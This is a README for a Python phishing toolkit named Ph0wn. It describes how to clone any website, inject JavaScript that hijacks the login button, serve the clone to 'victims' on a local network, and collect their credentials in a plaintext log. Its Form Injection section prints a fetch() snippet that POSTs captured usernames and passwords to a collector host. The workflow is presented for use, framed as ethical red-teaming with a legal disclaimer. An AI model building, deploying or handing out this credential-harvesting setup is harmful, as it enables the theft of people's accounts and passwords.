# Ph0wn — Ethical Phishing Toolkit

> Clone • Hook • Own  
> **Ph0wn** is an **offline‑first phishing laboratory** that lets red‑teamers and security students clone any public website, inject credential‑harvesting logic, and serve it inside a closed network—all from a single interactive CLI.

![demo](docs/demo.gif)  <!-- optional gif if user adds later -->

---

## Table of Contents

1. [Key Features](#key-features)  
2. [Architecture](#architecture)  
3. [Quick Start](#quick-start)  
4. [Detailed Usage](#detailed-usage)  
5. [Directory Layout](#directory-layout)  
6. [Configuration](#configuration)  
7. [Logs & Output](#logs--output)  
8. [Troubleshooting](#troubleshooting)  
9. [Roadmap](#roadmap)  
10. [Contributing](#contributing)  
11. [License](#license)  
12. [Legal Disclaimer](#legal-disclaimer)

---

## Key Features

| Capability | Module | Description |
|------------|--------|-------------|
| **Website cloning** | `create_phishing/clone_page.py` | Uses Selenium + BeautifulSoup to render JavaScript‑heavy pages, recursively download **HTML/CSS/JS**, images, media and rewrite links for offline use. |
| **Form hijacking / injection** | `create_phishing/create_form.py` | Interactive wizard to map username and password selectors, pick the *submit* button, choose the HTTP method, and automatically inject custom JavaScript that exfiltrates credentials. |
| **Project management** | `create_phishing/utils_phishing.py` | Helper functions (`choose_web`, `choose_index_item`) to browse and maintain cloned sites stored under `www/`. |
| **Local web server** | `server/socket.py` | One‑command static server (port **8000**) announcing the URL on the LAN so victims on the same Wi‑Fi can reach the page. |
| **Credential collector** | `server/post_server.py` | Lightweight JSON/URL‑encoded POST endpoint that **auto‑selects a free port (8080‑9000)** and appends submissions to `logs/post_logs.txt`. |
| **Rich CLI** | `main.py` | Colorful TUI powered by *Rich* and *PyFiglet* with five menu options: clone site, re‑inject form, deploy web, start POST server, exit. |
| **Portable design** | No external DBs or frameworks—everything is pure Python so you can run it from a USB stick in air‑gapped environments. |

---

## Architecture

```text
┌────────────┐      (1) selenium clone      ┌─────────────────────┐
│  Internet  │ ───────────────▶ │  create_phishing/clone_page │
└────────────┘                  └─────────────────────┘
                                       │
                                       │  (2) inject JS
                                       ▼
                              ┌─────────────────────┐
                              │ create_phishing/... │
                              └─────────────────────┘
                                       │
         (3) serve offline             │         (4) POST creds
   ┌──────────────────┐                │                ┌───────────────────┐
   │  server/socket   │◀───────────────┘───────────────▶│ server/post_server│
   └──────────────────┘                                 └───────────────────┘
                                       │
                                       ▼
                                  `logs/post_logs.txt`
```

---

## Quick Start

> Tested on **Python 3.11+** and **Google Chrome 120+** (Chromium works too).

```bash
# 1. Clone the repo
git clone https://github.com/your‑org/ph0wn.git
cd ph0wn

# 2. Set up a virtual environment (recommended)
python -m venv .venv
source .venv/bin/activate   # Windows: .venv\Scripts\activate

# 3. Install Python dependencies
pip install -r requirements.txt

# 4. Make sure chromedriver is in PATH
#    (↪  https://chromedriver.chromium.org/downloads)

# 5. Launch the toolkit
python main.py
```

---

## Detailed Usage

### Main Menu

| Option | Action |
|--------|--------|
| **1 · Create full phishing site** | Prompts for target URL, clones it, asks you to name the project, and immediately opens the *Form Injection* wizard. |
| **2 · Select existing web & inject form** | Re‑open a site you previously cloned (stored in **`www/`**) and run the injection wizard again. |
| **3 · Deploy site (socket server)** | Serves the selected `index.html` on port **8000** and prints the LAN URL. Press **Enter** to stop. |
| **4 · Start POST server** | Starts the credential collector on the first free port 8080‑9000. Press **Enter** to stop. |
| **5 · Exit** | Quit the program. |

### Cloning Walk‑through

1. **Enter the URL** you want to clone. `clone_page.py` spins up a headless Chrome instance to fetch the fully rendered DOM.  
2. All static assets are downloaded into **`www/<domain>/`** preserving folder structure:  
   - CSS → `css/`  
   - JS → `js/`  
   - Images/Media → `images/` or `media/`  
3. The HTML is rewritten so every resource points to its local copy.

### Form Injection Wizard

| Prompt | Meaning |
|--------|---------|
| *Selector for username field* | Any valid CSS selector, e.g. `input[name="email"]`. |
| *Selector for password field* | Same idea, e.g. `input[type="password"]`. |
| *Selector for submit button* | The button or link whose click should be hijacked. |
| *Destination URL* | Where to POST/GET the captured data. For local tests you can use the address printed by **Option 4**. |
| *HTTP method* | `GET`, `POST` or `PUT`. |
| *JSON template (POST/PUT only)* | Craft a JSON body and insert `<%username%>` / `<%password%>` placeholders. Multi‑line input supported. |

The wizard rewrites the HTML file, converting the chosen button to a normal element (`type="button"`) and stripping any previous `onclick` handlers. The injected `<script>`:

```js
fetch("http://<collector_ip>:<port>/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ user: "<%username%>", pass: "<%password%>" })
});
```

---

## Directory Layout

```
.
├── create_phishing/
│   ├── clone_page.py
│   ├── create_form.py
│   └── utils_phishing.py
├── server/
│   ├── socket.py
│   └── post_server.py
├── logs/
│   └── post_logs.txt          # <- generated on first run
├── www/                       # <- cloned sites live here (ignored by .gitignore)
├── requirements.txt
└── main.py
```

---

## Configuration

### Environment Variables

| Variable | Default | Purpose |
|----------|---------|---------|
| `PH0WN_SOCKET_PORT` | `8000` | Change the port of the static web server. |
| `PH0WN_POST_RANGE` | `8080-9000` | Port range scanned for the POST server. |

> You can export these before launching `main.py`. Example:  
> `export PH0WN_SOCKET_PORT=9000`

### Browser Driver

Ph0wn relies on **Chromedriver**. If the executable is not in `PATH`, set:

```bash
export CHROMEDRIVER=/custom/path/chromedriver
```

---

## Logs & Output

| File | Content |
|------|---------|
| `logs/post_logs.txt` | `[YYYY-MM-DD HH:MM:SS] USERNAME: <user> | PASSWORD: <pass>` one entry per submission. |
| `www/<project>/` | Complete offline copy of the target site with injected JavaScript. |

Both paths are ignored by `.gitignore` so you never commit sensitive data.

---

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `selenium.common.exceptions.WebDriverException: Message: 'chromedriver' executable needs to be in PATH` | Download the driver that matches your Chrome version and add it to `PATH`. |
| Blank page after cloning | Some modern sites require CSP/iframe modifications—check the browser console for blocked resources. |
| POST server not reachable from victim | Make sure collector host and victim are on the same subnet and no firewall blocks the chosen port. |

---

## Roadmap

- [ ] Auto‑detect login forms and suggest selectors.  
- [ ] Bundled **Chromium** + **Chromedriver** for instant portability.  
- [ ] HTTPS self‑signed certificates.  
- [ ] Docker image.  
- [ ] GUI front‑end (Tauri).

---

## Contributing

1. Fork the project and create your branch: `git checkout -b feature/awesome`.  
2. Commit your changes with clear messages.  
3. Ensure `pre-commit run --all-files` passes (adds `black`, `flake8`, `isort`).  
4. Open a pull request describing *why* the change is valuable.

---

## License

Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for more information.

---

## Legal Disclaimer

Ph0wn is **for educational and authorized penetration‑testing only**.  
Running phishing campaigns against systems **without written permission** is illegal and punishable under cyber‑crime laws. The authors and contributors assume **no liability** for misuse.

*Use responsibly — stay ethical.*  
